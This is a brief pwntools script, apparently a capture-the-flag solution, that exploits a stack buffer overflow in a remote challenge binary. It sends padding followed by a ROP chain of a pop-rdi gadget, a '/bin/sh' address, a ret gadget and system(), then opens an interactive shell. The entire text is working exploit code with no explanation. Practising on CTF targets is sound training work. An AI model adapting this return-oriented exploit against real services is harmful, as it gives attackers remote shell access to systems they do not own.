from pwn import *
context.log_level = 'debug'
io = remote('pwn.challenge.ctf.show',28200)
elf = ELF('pwn')
system = elf.symbols['system']
bin_sh = 0x400808
pop_rdi = 0x4007E3 
ret = 0x4004FE
payload = b'a'*(0xA+8)+ p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)
io.sendline(payload)
io.recv()
io.interactive()
